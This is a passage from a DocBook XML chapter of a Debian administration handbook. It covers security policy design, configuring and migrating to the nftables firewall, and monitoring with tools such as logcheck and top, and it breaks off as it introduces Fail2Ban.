<?xml version="1.0"?>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1"/>
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>Firewall</keyword>
      <keyword>Netfilter</keyword>
      <keyword>nftables</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>Security</title>
  <highlights>
    <para>An information system can have a varying level of importance
    depending on the environment. In some cases, it is vital to a company's
    survival. It must therefore be protected from various kinds of risks.
    The process of evaluating these risks, defining and implementing the
    protection is collectively known as the “security process”.</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>Defining a Security Policy</title>
    <indexterm><primary>security</primary><secondary>policy</secondary></indexterm>

    <sidebar>
      <title><emphasis>CAUTION</emphasis> Scope of this chapter</title>

      <!-- TODO: Is this book still a good recommendation? It is from 2005 -->
      <para>Security is a vast and very sensitive subject, so we cannot
      claim to describe it in any kind of comprehensive manner in the
      course of a single chapter. We will only delineate a few important
      points and describe some of the tools and methods that can be of use
      in the security domain. For further reading, literature abounds, and
      entire books have been devoted to the subject. <!--An excellent starting
      point would be <citetitle>Linux Server Security</citetitle> by
      Michael D. Bauer (published by O'Reilly).--></para>
    </sidebar>

    <para>The word “security” itself covers a vast range of concepts,
    tools and procedures, none of which apply universally. Choosing among
    them requires a precise idea of what your goals are. Securing a system
    starts with answering a few questions. Rushing headlong into
    implementing an arbitrary set of tools runs the risk of focusing on the
    wrong aspects of security.</para>

    <para>The very first thing to determine is therefore the goal. A good
    approach to help with that determination starts with the following
    questions:</para>

    <itemizedlist>
      <listitem>
        <para><emphasis>What</emphasis> are we trying to protect? The
        security policy will be different depending on whether we want to
        protect computers or data. In the latter case, we also need to know
        which data.</para>
      </listitem>
      <listitem>
        <para>What are we trying to protect <emphasis>against</emphasis>?
        Is it leakage of confidential data? Accidental data loss? Revenue
        loss caused by disruption of service?</para>
      </listitem>
      <listitem>
        <para>Also, <emphasis>who</emphasis> are we trying to protect
        against? Security measures will be quite different for guarding
        against a typo by a regular user of the system than they would be
        when protecting against a determined attacker group.</para>
      </listitem>
    </itemizedlist>

    <indexterm><primary>security</primary><secondary>risk</secondary></indexterm>

    <para>The term “risk” is customarily used to refer collectively to
    these three factors: what to protect, what needs to be prevented from
    happening, and who will try to make it happen. Modeling the risk
    requires answers to these three questions. From this risk model, a
    security policy can be constructed, and the policy can be implemented
    with concrete actions.</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> Permanent questioning</title>

      <para>Bruce Schneier, a world expert in security matters (not only
      computer security) tries to counter one of security's most important
      myths with a motto: “Security is a process, not a product”.
      Assets to be protected change in time, and so do threats and the
      means available to potential attackers. Even if a security policy has
      initially been perfectly designed and implemented, one should never
      rest on one's laurels. The risk components evolve, and the response
      to that risk must evolve accordingly.</para>
      <indexterm><primary>Schneier, Bruce</primary></indexterm>
      <indexterm><primary>Bruce Schneier</primary></indexterm>
    </sidebar>

    <para>Extra constraints are also worth taking into account, as they can
    restrict the range of available policies. How far are we willing to
    go to secure a system? This question has a major impact on the policy
    to implement. The answer is too often only defined in terms of monetary
    costs, but the other elements should also be considered, such as the
    amount of inconvenience imposed on system users or performance
    degradation.</para>

    <para>Once the risk has been modeled, one can start thinking about
    designing an actual security policy.</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> Extreme policies</title>

      <para>There are cases where the choice of actions required to secure
      a system is extremely simple.</para>

      <para>For instance, if the system to be protected only comprises a
      second-hand computer, the sole use of which is to add a few numbers
      at the end of the day, deciding not to do anything special to protect
      it would be quite reasonable. The intrinsic value of the system is
      low. The value of the data is zero since they are not stored on the
      computer. A potential attacker infiltrating this “system” would
      only gain an unwieldy calculator. The cost of securing such a system
      would probably be greater than the cost of a breach.</para>

      <para>At the other end of the spectrum, we might want to protect the
      confidentiality of secret data in the most comprehensive way
      possible, trumping any other consideration. In this case, an
      appropriate response would be the total destruction of these data
      (securely erasing the files, shredding of the hard disks to bits,
      then dissolving these bits in acid, and so on). If there is an
      additional requirement that data must be kept in store for future use
      (although not necessarily readily available), and if cost still isn't
      a factor, then a starting point would be storing the data on
      iridium–platinum alloy plates stored in bomb-proof bunkers under
      various mountains in the world, each of which being (of course) both
      entirely secret and guarded by entire armies…</para>

      <para>Extreme though these examples may seem, they would, nevertheless,
      be an adequate response to defined risks, insofar as they are the
      outcome of a thought process that takes into account the goals to
      reach and the constraints to fulfill. When coming from a reasoned
      decision, no security policy is less respectable than any
      other.</para>
    </sidebar>

    <para>In most cases, the information system can be segmented in
    consistent and mostly independent subsets. Each subsystem will have its
    own requirements and constraints, and so the risk assessment and the
    design of the security policy should be undertaken separately for each.
    A good principle to keep in mind is that a short and well-defined
    perimeter is easier to defend than a long and winding frontier. The
    network organization should also be designed accordingly: the sensitive
    services should be concentrated on a small number of machines, and
    these machines should only be accessible via a minimal number of
    check-points; securing these check-points will be easier than securing
    all the sensitive machines against the entirety of the outside world.
    It is at this point that the usefulness of network filtering (including
    by firewalls) becomes apparent. This filtering can be implemented with
    dedicated hardware, but a possibly simpler and more flexible solution
    is to use a software firewall such as the one integrated in the Linux
    kernel.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>Firewall or Packet Filtering</title>
    <indexterm><primary>firewall</primary></indexterm>
    <indexterm><primary>packet</primary><secondary>filter</secondary><seealso>firewall</seealso></indexterm>

    <sidebar>
      <title><emphasis>BACK TO BASICS</emphasis> Firewall</title>
      <indexterm><primary>packet</primary><secondary>IP</secondary></indexterm>

      <para>A <emphasis>firewall</emphasis> is a piece of computer
      equipment with hardware and/or software that sorts the incoming or
      outgoing network packets (coming to or from a local network) and only
      lets through those matching certain predefined conditions.</para>
    </sidebar>

    <para>A firewall is a filtering network gateway and is only effective
    on packets that must go through it. Therefore, it can only be effective
    when going through the firewall is the only route for these
    packets.</para>

    <sidebar>
      <title><emphasis>SPECIFIC CASE</emphasis> Local Firewall</title>

      <para>A firewall can be restricted to one particular machine (as opposed
      to a complete network), in which case its role is to filter or limit
      access to some services. It is, however, always better to configure
      services to not listen on those network interfaces, where these services
      are not supposed to be offered, or to disable and remove services, which
      are not to be offered at all, than to use a packet filter to prevent any
      unwanted access to these services.</para>

      <para>Its role can also be to filter or limit connections by rogue or
      poorly programmed software that a user could, willingly or not, have
      installed. The reliability of this, however, highly depends on the goal
      of these actions and the integrity of the system itself. This action is
      not a measurement to prevent potential threats to send data.</para>
    </sidebar>

    <para>The Linux kernel embeds the <emphasis>netfilter</emphasis>
    firewall, which can be controlled from user space with the
    <command>iptables</command>, <command>ip6tables</command>,
    <command>arptables</command> and <command>ebtables</command> commands.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>

    <para>However, Netfilter iptables commands are being replaced by nftables,
    which avoids many of its problems. Its design involves less code
    duplication, and it can be managed with just the <command>nft</command>
    command. Since Debian <emphasis role="distribution">Buster</emphasis>, the
    nftables framework is used by default. The commands mentioned before are
    provided by versions, which use the nftables kernel API, by default. If one
    requires the “classic“ commands, the relevant binaries can be adjusted
    using <command>update-alternatives</command>.</para>

    <sidebar>
      <title><emphasis>TOOLS</emphasis> fwbuilder and ufw</title>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>
      <indexterm><primary><command>ufw</command></primary></indexterm>

      <para>Although (destined to) being replaced by nftables,
      <command>iptables</command> is still widely used and suited for many
      use-cases. Creating a rule requires an invocation of
      <command>iptables</command>/<command>ip6tables</command>. Typing these
      commands manually can be tedious, so the calls are usually stored in a
      script, so that the same configuration is set up automatically every time
      the machine boots, or they can be made “persistent“ using <emphasis
      role="pkg">iptables-persistent</emphasis>.</para>

      <para>A script usually needs to be written by hand. But there are, tools
      that make it simpler to configure the <emphasis>netfilter</emphasis>
      firewall, with a graphical representation of the filtering rules.
      <command>fwbuilder</command> is undoubtedly among the best of them. The
      rules are created with simple drag-and-drop actions on objects
      (interfaces, networks, ports, servers, etc.). A few contextual menus can
      change the condition (negating it, for instance). Then the action needs
      to be chosen and configured.</para>

      <para>An alternative to writing and saving/loading the required rules is
      to use <command>ufw</command> from the package with the same name. This
      tool is a frontend to <command>iptables</command> as well, but it
      provides a command line interface only. Simple commands can enable or
      disable (block) network traffic to and from ports and IP addresses. The
      configuration files in <filename>/etc/ufw/</filename> also allow for
      complex rulesets (e.g. hooking into the Docker chains), which are then
      saved and loaded automatically. This tool is often used for simple setups
      and to block</para>

      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/ufw/</filename></secondary></indexterm>
    </sidebar>

    <para>To enable a default firewall in Debian execute:</para>

    <screen><computeroutput># </computeroutput><userinput>apt install -y nftables
</userinput><computeroutput>Reading package lists... Done
...
# </computeroutput><userinput>systemctl enable nftables.service</userinput><computeroutput>
Created symlink /etc/systemd/system/sysinit.target.wants/nftables.service → /lib/systemd/system/nftables.service.
</computeroutput></screen>

    <section id="sect.netfilter">
      <title>nftables Behavior</title>
      <indexterm><primary>nftables</primary></indexterm>

      <para>As the kernel is processing a network packet, it pauses and allows
      us to inspect the packet and decide what to do with that packet.
      For example, we might want to drop or discard certain incoming packets,
      modify other packets in various ways, block certain outgoing packets
      to control against malware or redirect some packets at the earliest
      possible stage to bridge network interfaces or to spread the load of
      incoming packets between systems.</para>

      <indexterm><primary>OSI</primary></indexterm>
      <indexterm><primary>Open Systems Interconnection</primary><see>OSI</see></indexterm>

      <para>A good understanding of the layers 3, 4 and 5 of the OSI (Open
      Systems Interconnection) model is essential to get the most from
      netfilter.</para>

    <sidebar>
      <title><emphasis>CULTURE</emphasis> The OSI model</title>
      <indexterm><primary>OSI</primary><secondary>model</secondary></indexterm>

      <para>The OSI model is a conceptual model to implement networking
      protocols without regard to its underlying internal
      structure and technology. Its goal is the interoperability of diverse
      communication systems with standard communication protocols.</para>

      <para>This model was defined in the standard ISO/EIC 7498. The following
      seven layers are described:</para>

      <orderedlist>
        <listitem>
          <para>Physical: transmission and reception of raw bit streams over
          a physical medium</para>
        </listitem>
        <listitem>
          <para>Data Link: reliable transmission of data frames between two
          nodes connected by a physical layer</para>
        </listitem>
        <listitem>
          <para>Network: structuring and managing a multi-node network,
          including addressing, routing and traffic control</para>
        </listitem>
        <listitem>
          <para>Transport: reliable transmission of data segments
          between points on a network, including segmentation,
          acknowledgment and multiplexing</para>
        </listitem>
        <listitem>
          <para>Session: managing communication sessions, i.e. continuous
          exchange of information in the form of multiple back-and-forth
          transmissions between two nodes</para>
        </listitem>
        <listitem>
          <para>Presentation: translation of data between a networking service
          and an application; including character encoding, data compression
          and encryption/decryption</para>
        </listitem>
        <listitem>
          <para>Application: High-level APIs, including resource sharing,
          remote file access.</para>
        </listitem>
      </orderedlist>

      <para>More information can be found on Wikipedia: <ulink type="block"
      url="https://en.wikipedia.org/wiki/OSI_model"/></para>
    </sidebar>

    <indexterm><primary>firewall</primary><secondary>tables</secondary></indexterm>
    <indexterm><primary>firewall</primary><secondary>rules</secondary></indexterm>
    <indexterm><primary>firewall</primary><secondary>chains</secondary></indexterm>

    <para>The firewall is configured with <emphasis>tables</emphasis>, which
      hold <emphasis>rules</emphasis> contained in <emphasis>chains</emphasis>.
      Unlike iptables, <emphasis>nftables</emphasis> does not have
      any default table. The user decides which and how many tables to
      create. Every table must have only one of the following five
      families assigned:
      <literal>ip</literal>, <literal>ip6</literal>,
      <literal>inet</literal>, <literal>arp</literal> and <literal>bridge</literal>.
      <literal>ip</literal> is used if the family is not specified.</para>

      <para>There are two types of chains: <emphasis>base chains</emphasis> and
      <emphasis>regular chains</emphasis>. A base chain is an entry
      point for packets from the networking stack. Base chains are registered into
      the Netfilter hooks, e.g. they see packets flowing through
      the TCP/IP stack. On the other hand, a regular chain is not
      attached to any hook so it does not see any traffic. But it
      may be used as a jump target for better organization of the rules.</para>
      <indexterm><primary>chain</primary></indexterm>

      <para>Rules are made of statements, which includes some expressions
      to be matched and then a verdict statement, like
      <literal>accept</literal>, <literal>drop</literal>,
      <literal>queue</literal>, <literal>continue</literal>,
      <literal>return</literal>, <literal>jump chain</literal> and
      <literal>goto chain</literal>.</para>
      <indexterm><primary>rule</primary></indexterm>

      <!-- TODO: Remove or replace this image
      <figure id="figure.chaines-netfilter">
        <title>How <emphasis>netfilter</emphasis> chains are called</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%"/>
          </imageobject>
        </mediaobject>
      </figure>
      -->

      <sidebar>
        <title><emphasis>BACK TO BASICS</emphasis> ICMP</title>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary><see>ICMP</see></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

        <para>ICMP (<emphasis>Internet Control Message Protocol</emphasis>)
        is the protocol used to transmit complementary information on
        communications. It allows testing network connectivity with the
        <command>ping</command> command (which sends an ICMP <emphasis>echo
        request</emphasis> message, which the recipient is meant to answer
        with an ICMP <emphasis>echo reply</emphasis> message). It signals a
        firewall rejecting a packet, indicates an overflow in a receive
        buffer, proposes a better route for the next packets in the
        connection, and so on. This protocol is defined by several RFC
        documents; the initial RFC777 and RFC792 were soon completed and
        extended.
        <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html"/>
        <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html"/>
        </para>

        <para>For reference, a receive buffer is a small memory zone
        storing data between the time it arrives from the network and the
        time the kernel handles it. If this zone is full, new data cannot
        be received, and ICMP signals the problem, so that the emitter can
        slow down its transfer rate (which should ideally reach an
        equilibrium after some time).</para>
        <indexterm><primary>receive buffer</primary></indexterm>
        <indexterm><primary>buffer</primary><secondary>receive buffer</secondary></indexterm>

        <para>Note that although an IPv4 network can work without ICMP,
        ICMPv6 is strictly required for an IPv6 network, since it combines
        several functions that were, in the IPv4 world, spread across
        ICMPv4, IGMP (<emphasis>Internet Group Membership
        Protocol</emphasis>) and ARP (<emphasis>Address Resolution
        Protocol</emphasis>). ICMPv6 is defined in RFC4443. <ulink
        type="block" url="http://www.faqs.org/rfcs/rfc4443.html"/></para>
      </sidebar>
    </section>
    <section>
      <title>Moving from iptables to nftables</title>
      <para>The <command>iptables-translate</command> and
      <command>ip6tables-translate</command> commands can be used
      to translate old iptables commands into the new nftables syntax. Whole
      rulesets can also be translated, in this case we migrate the rules
      configured in one computer which has Docker installed:</para>

      <!-- MAY CHANGE: output -->
      <screen><computeroutput># </computeroutput><userinput>iptables-save &gt; iptables-ruleset.txt
</userinput><computeroutput># </computeroutput><userinput>iptables-restore-translate -f iptables-ruleset.txt
</userinput><computeroutput>
# Translated by iptables-restore-translate v1.8.7 on Wed Mar 16 22:06:32 2022
add table ip filter
add chain ip filter INPUT { type filter hook input priority 0; policy accept; }
add chain ip filter FORWARD { type filter hook forward priority 0; policy drop; }
add chain ip filter OUTPUT { type filter hook output priority 0; policy accept; }
add chain ip filter DOCKER
add chain ip filter DOCKER-ISOLATION-STAGE-1
add chain ip filter DOCKER-ISOLATION-STAGE-2
add chain ip filter DOCKER-USER
add rule ip filter FORWARD counter jump DOCKER-USER
add rule ip filter FORWARD counter jump DOCKER-ISOLATION-STAGE-1
add rule ip filter FORWARD oifname "docker0" ct state related,established counter accept
add rule ip filter FORWARD oifname "docker0" counter jump DOCKER
add rule ip filter FORWARD iifname "docker0" oifname != "docker0" counter accept
add rule ip filter FORWARD iifname "docker0" oifname "docker0" counter accept
add rule ip filter DOCKER-ISOLATION-STAGE-1 iifname "docker0" oifname != "docker0" counter jump DOCKER-ISOLATION-STAGE-2
add rule ip filter DOCKER-ISOLATION-STAGE-1 counter return
add rule ip filter DOCKER-ISOLATION-STAGE-2 oifname "docker0" counter drop
add rule ip filter DOCKER-ISOLATION-STAGE-2 counter return
add rule ip filter DOCKER-USER counter return
add table ip nat
add chain ip nat PREROUTING { type nat hook prerouting priority -100; policy accept; }
add chain ip nat INPUT { type nat hook input priority 100; policy accept; }
add chain ip nat OUTPUT { type nat hook output priority -100; policy accept; }
add chain ip nat POSTROUTING { type nat hook postrouting priority 100; policy accept; }
add chain ip nat DOCKER
add rule ip nat PREROUTING fib daddr type local counter jump DOCKER
add rule ip nat OUTPUT ip daddr != 127.0.0.0/8 fib daddr type local counter jump DOCKER
add rule ip nat POSTROUTING oifname != "docker0" ip saddr 172.17.0.0/16 counter masquerade
add rule ip nat DOCKER iifname "docker0" counter return
# Completed on Wed Mar 16 22:06:32 2022
# </computeroutput><userinput>iptables-restore-translate -f iptables-ruleset.txt &gt; ruleset.nft
</userinput><computeroutput># </computeroutput><userinput>nft -f ruleset.nft
</userinput><computeroutput># </computeroutput><userinput>nft list ruleset</userinput><computeroutput>
table inet filter {
	chain input {
		type filter hook input priority filter; policy accept;
	}

	chain forward {
		type filter hook forward priority filter; policy accept;
	}

	chain output {
		type filter hook output priority filter; policy accept;
	}
}
table ip nat {
	chain DOCKER {
		iifname "docker0" counter packets 0 bytes 0 return
		iifname "docker0" counter packets 0 bytes 0 return
	}

	chain POSTROUTING {
		type nat hook postrouting priority srcnat; policy accept;
		oifname != "docker0" ip saddr 172.17.0.0/16 counter packets 0 bytes 0 masquerade
		oifname != "docker0" ip saddr 172.17.0.0/16 counter packets 0 bytes 0 masquerade
	}

	chain PREROUTING {
		type nat hook prerouting priority dstnat; policy accept;
		fib daddr type local counter packets 1 bytes 60 jump DOCKER
		fib daddr type local counter packets 0 bytes 0 jump DOCKER
	}

	chain OUTPUT {
		type nat hook output priority -100; policy accept;
		ip daddr != 127.0.0.0/8 fib daddr type local counter packets 0 bytes 0 jump DOCKER
		ip daddr != 127.0.0.0/8 fib daddr type local counter packets 0 bytes 0 jump DOCKER
	}

	chain INPUT {
		type nat hook input priority 100; policy accept;
	}
}
table ip filter {
	chain DOCKER {
	}

	chain DOCKER-ISOLATION-STAGE-1 {
		iifname "docker0" oifname != "docker0" counter packets 0 bytes 0 jump DOCKER-ISOLATION-STAGE-2
		counter packets 0 bytes 0 return
		iifname "docker0" oifname != "docker0" counter packets 0 bytes 0 jump DOCKER-ISOLATION-STAGE-2
		counter packets 0 bytes 0 return
	}

	chain DOCKER-ISOLATION-STAGE-2 {
		oifname "docker0" counter packets 0 bytes 0 drop
		counter packets 0 bytes 0 return
		oifname "docker0" counter packets 0 bytes 0 drop
		counter packets 0 bytes 0 return
	}

	chain FORWARD {
		type filter hook forward priority filter; policy drop;
		counter packets 0 bytes 0 jump DOCKER-USER
		counter packets 0 bytes 0 jump DOCKER-ISOLATION-STAGE-1
		oifname "docker0" ct state related,established counter packets 0 bytes 0 accept
		oifname "docker0" counter packets 0 bytes 0 jump DOCKER
		iifname "docker0" oifname != "docker0" counter packets 0 bytes 0 accept
		iifname "docker0" oifname "docker0" counter packets 0 bytes 0 accept
		counter packets 0 bytes 0 jump DOCKER-USER
		counter packets 0 bytes 0 jump DOCKER-ISOLATION-STAGE-1
		oifname "docker0" ct state established,related counter packets 0 bytes 0 accept
		oifname "docker0" counter packets 0 bytes 0 jump DOCKER
		iifname "docker0" oifname != "docker0" counter packets 0 bytes 0 accept
		iifname "docker0" oifname "docker0" counter packets 0 bytes 0 accept
	}

	chain DOCKER-USER {
		counter packets 0 bytes 0 return
		counter packets 0 bytes 0 return
	}

	chain INPUT {
		type filter hook input priority filter; policy accept;
	}

	chain OUTPUT {
		type filter hook output priority filter; policy accept;
	}
}
</computeroutput>
</screen>

      <para>The tools <command>iptables-nft</command>, <command>ip6tables-nft</command>,
      <command>arptables-nft</command>, <command>ebtables-nft</command> are versions
      of iptables that use the nftables API, so users can keep using the old
      iptables syntax with them, but that is not recommended; these tools
      should only be used for backwards compatibility.</para>
    </section>

    <section id="sect.nftables">
      <title>Syntax of <command>nft</command></title>
      <indexterm><primary><command>nft</command></primary></indexterm>

      <para>The <command>nft</command> commands allow manipulating tables,
      chains and rules. The <literal>table</literal> option supports multiple
      operations: <literal>add</literal>, <literal>create</literal>,
      <literal>delete</literal>, <literal>list</literal> and
      <literal>flush</literal>. <command>nft add table ip6 mangle</command>
      adds a new table from the family <literal>ip6</literal>.</para>

      <para>To insert a new base chain to the <literal>filter</literal> table,
      you can execute the following command (note that the semicolon is escaped
      with a backslash when using Bash):</para>

      <screen><computeroutput># </computeroutput><userinput>nft add chain filter input { type filter hook input priority 0 \; }</userinput></screen>

      <para>Rules are usually added with the following syntax: <command>nft add
      rule [<replaceable>family</replaceable>] <replaceable>table</replaceable>
      <replaceable>chain</replaceable> handle <replaceable>handle</replaceable>
      statement</command>.</para>

      <para><command>insert</command> is similar to the <command>add</command>
      command, but the given rule is prepended to the beginning of the chain or
      before the rule with the given handle instead of at the end or after that
      rule. For example, the following command inserts a rule before the rule
      with handler number 8:</para>

      <screen><computeroutput># </computeroutput><userinput>nft insert rule filter output position 8 ip daddr 127.0.0.8 drop</userinput></screen>

      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/nftables.conf</filename></secondary></indexterm>

      <para>The executed <command>nft</command> commands do not make permanent
      changes to the configuration, so they are lost if they are not saved. The
      firewall rules are located in <filename>/etc/nftables.conf</filename>. A
      simple way to save the current firewall configuration permanently is to
      execute <command>nft list ruleset &gt; /etc/nftables.conf</command> as
      root.</para>

      <para><command>nft</command> allows many more operations, refer to its
      manual page <citerefentry><refentrytitle>nft</refentrytitle>
      <manvolnum>8</manvolnum></citerefentry> for more information.</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>Installing the Rules at Each Boot</title>
      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/nftables.conf</filename></secondary></indexterm>
      <indexterm><primary>service</primary><secondary><filename>nftables.service</filename></secondary></indexterm>

      <para>To enable a default firewall in Debian, you need to store the rules
      in <filename>/etc/nftables.conf</filename> and execute <command>systemctl
      enable nftables</command> as root. You can stop the firewall by executing
      <command>nft flush ruleset</command> as root.</para>

      <para>In other cases, the recommended way is to register the
      configuration script in <literal>up</literal> directive of the
      <filename>/etc/network/interfaces</filename> file. In the following
      example, the script is stored under
      <filename>/usr/local/etc/arrakis.fw</filename>.</para>

      <example id="example.network-interfaces-firewall">
        <title><filename>interfaces</filename> file calling firewall script</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw
</programlisting>
      </example>

      <para>This obviously assumes that you are using <emphasis
      role="pkg">ifupdown</emphasis> to configure the network interfaces. If
      you are using something else (like <emphasis>NetworkManager</emphasis> or
      <emphasis>systemd-networkd</emphasis>), then refer to their respective
      documentation to find out ways to execute a script after the interface
      has been brought up.</para>
    </section>
  </section>
  <section id="sect.supervision">
    <title>Supervision: Prevention, Detection, Deterrence</title>
    <indexterm><primary>monitoring</primary></indexterm>

    <para>Monitoring is an integral part of any security policy for several
    reasons. Among them, that the goal of security is usually not
    restricted to guaranteeing data confidentiality, but it also includes
    ensuring availability of the services. It is therefore imperative to
    check that everything works as expected, and to detect in a timely
    manner any deviant behavior or change in quality of the service(s)
    rendered. Monitoring activity can help detecting intrusion
    attempts and enable a swift reaction before they cause grave
    consequences. This section reviews some tools that can be used to
    monitor several aspects of a Debian system. As such, it completes
    <xref linkend="sect.monitoring"/>.</para>

    <section id="sect.logcheck">
      <title>Monitoring Logs with <command>logcheck</command></title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>logs</primary><secondary>monitoring</secondary></indexterm>
      <indexterm><primary>monitoring</primary><secondary>log files</secondary></indexterm>
      <indexterm><primary>file</primary><secondary>log file</secondary></indexterm>

      <para>The <command>logcheck</command> program monitors log files
      every hour by default. It sends unusual log messages in emails to the
      administrator for further analysis.</para>

      <para>The list of monitored files is stored in
      <filename>/etc/logcheck/logcheck.logfiles</filename>; the default
      values work fine if the <filename>/etc/rsyslog.conf</filename> file
      has not been completely overhauled.</para>

      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/logcheck/</filename></secondary><seealso><command>logcheck</command></seealso></indexterm>
      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/rsyslog.conf</filename></secondary></indexterm>

      <para><command>logcheck</command> can work in one of three more or
      less detailed modes: <emphasis>paranoid</emphasis>,
      <emphasis>server</emphasis> and <emphasis>workstation</emphasis>. The
      first one is <emphasis>very</emphasis> verbose, and should probably
      be restricted to specific servers such as firewalls. The second (and
      default) mode is recommended for most servers. The last one is
      designed for workstations, and is even terser (it filters out more
      messages).</para>

      <para>In all three cases, <command>logcheck</command> should probably
      be customized to exclude some extra messages (depending on installed
      services), unless the admin really wishes to receive hourly batches
      of long uninteresting emails. Since the message selection mechanism
      is rather complex,
      <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename>
      is a required — if challenging — read.</para>

      <para>The applied rules can be split into several types:</para>
      <itemizedlist>
        <listitem>
          <para>those that qualify a message as a cracking attempt (stored
          in a file in the <filename>/etc/logcheck/cracking.d/</filename>
          directory);</para>
        </listitem>
        <listitem>
          <para>those canceling such a qualification
          (<filename>/etc/logcheck/cracking.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
          <para>those classifying a message as a security alert
          (<filename>/etc/logcheck/violations.d/</filename>);</para>
        </listitem>
        <listitem>
          <para>those canceling this classification
          (<filename>/etc/logcheck/violations.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
          <para>finally, those applying to the remaining messages
          (considered as <emphasis>system events</emphasis>).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> Ignoring a message</title>

        <para>Any message tagged as a cracking attempt or a security alert
        (following a rule stored in a
        <filename>/etc/logcheck/violations.d/myfile</filename> file) can
        only be ignored by a rule in a
        <filename>/etc/logcheck/violations.ignore.d/myfile</filename> or
        <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename>
        file.</para>
      </sidebar>

      <para>A system event is always signaled unless a rule in one of the
      <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename>
      directories states the event should be ignored. Of course, the only
      directories taken into account are those corresponding to verbosity
      levels equal or greater than the selected operation mode.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>Monitoring Activity</title>
      <indexterm><primary>monitoring</primary><secondary>activity</secondary></indexterm>
      <indexterm><primary>activity, monitoring</primary></indexterm>

      <section id="sect.real-time-monitoring">
        <title>In Real Time</title>
        <indexterm><primary><command>top</command></primary></indexterm>

        <para><command>top</command> is an interactive tool that displays a
        list of currently running processes. The default sorting is based
        on the current amount of processor use and can be obtained with the
        <keycap>P</keycap> key. Other sort orders include a sort by
        occupied memory (<keycap>M</keycap> key), by total processor time
        (<keycap>T</keycap> key) and by process identifier
        (<keycap>N</keycap> key). The <keycap>k</keycap> key allows killing
        a process by entering its process identifier. The
        <keycap>r</keycap> key allows <emphasis>renicing</emphasis> a
        process, i.e. changing its priority.</para>

        <para>When the system seems to be overloaded,
        <command>top</command> is a great tool to see which processes are
        competing for processor time or consume too much memory. In
        particular, it is often interesting to check if the processes
        consuming resources match the real services that the machine is
        known to host. An unknown process running as the www-data user
        should really stand out and be investigated, since it is probably an
        instance of software installed and executed on the system through a
        vulnerability in a web application.</para>

        <para><command>top</command> is a very flexible tool and its manual
        page gives details on how to customize its display and adapt it to
        one's personal needs and habits.</para>

        <para>The <command>gnome-system-monitor</command> graphical tool
        is similar to <command>top</command> and it provides roughly the same
        features.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>History</title>
        <indexterm><primary>activity, history</primary></indexterm>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary><see>SNMP</see></indexterm>
        <indexterm><primary><command>cacti</command></primary></indexterm>

        <para>Processor load, network traffic and free disk space are
        information that are constantly varying. Keeping a history of their
        evolution is often useful in determining exactly how the computer
        is used.</para>

        <para>There are many dedicated tools for this task. Most can fetch
        data via SNMP (<emphasis>Simple Network Management
        Protocol</emphasis>) in order to centralize this information. An
        added benefit is that this allows fetching data from network
        elements that may not be general-purpose computers, such as
        dedicated network routers or switches.</para>

        <para>This book deals with Munin in some detail (see <xref
        linkend="sect.munin"/>) as part of <xref
        linkend="advanced-administration" xrefstyle="select: label
        quotedtitle"/>. Debian also provides a similar tool, <emphasis
        role="pkg">cacti</emphasis>. Its deployment is slightly more
        complex, since it is based solely on SNMP. Despite having a web
        interface, grasping the concepts involved in configuration still
        requires some effort. Reading the HTML documentation
        (<filename>/usr/share/doc/cacti/html/Table-of-Contents.html</filename>)
        should be considered a prerequisite.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

          <para><command>mrtg</command> (in the similarly-named package) is
          an older tool. Despite some rough edges, it can aggregate
          historical data and display them as graphs. It includes a number
          of scripts dedicated to collecting the most commonly monitored
          data such as processor load, network traffic, web page hits, and
          so on.</para>

          <para>The <emphasis role="pkg">mrtg-contrib</emphasis> and
          <emphasis role="pkg">mrtgutils</emphasis> packages contain
          example scripts that can be used directly.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>Avoiding Intrusion</title>
      <indexterm><primary>intrusion detection</primary></indexterm>
      <indexterm><primary>brute-force</primary></indexterm>
      <indexterm><primary><emphasis role="pkg">fail2ban</emphasis></primary></indexterm>

      <para>Attackers try to get access to servers by guessing
      passwords, which is why strong passwords must always be used.
      Even then, you should also establish measures against
      brute-force attacks. A brute-force attack is an attempt to
      log into an unauthorized software system by performing multiple
      login attempts in a short period of time.</para>

      <para>The best way to stop a brute-force attack is to limit the
      number of login attempts coming from the same origin, usually
      by temporarily banning an IP address.</para>

      <para>Fail2Ban is an intrusion prevention software suite that can
